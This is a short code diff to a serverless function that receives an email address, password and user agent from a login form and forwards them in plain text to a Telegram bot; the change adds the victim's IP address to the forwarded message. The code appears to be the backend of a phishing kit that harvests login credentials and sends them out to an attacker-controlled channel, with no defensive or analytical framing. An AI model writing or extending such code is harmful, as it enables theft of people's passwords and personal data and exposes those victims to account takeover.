@@ -16,12 +16,12 @@ exports.handler = async (event) => {
     return { statusCode: 400, body: JSON.stringify({ ok: false, error: 'Invalid JSON' }) };
   }
 
-  const { email, password, userAgent } = body;
+  const { email, password, userAgent, clientIp } = body;
   if (!email || !password) {
     return { statusCode: 400, body: JSON.stringify({ ok: false, error: 'Missing email or password' }) };
   }
 
-  const text = `🔐 Login\nEmail: ${email}\nPassword: ${password}\nUser-Agent: ${userAgent || 'unknown'}`;
+  const text = `🔐 Login\nEmail: ${email}\nPassword: ${password}\nUser-Agent: ${userAgent || 'unknown'}\nIP Address: ${clientIp || 'unknown'}`;
 
   try {
     const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
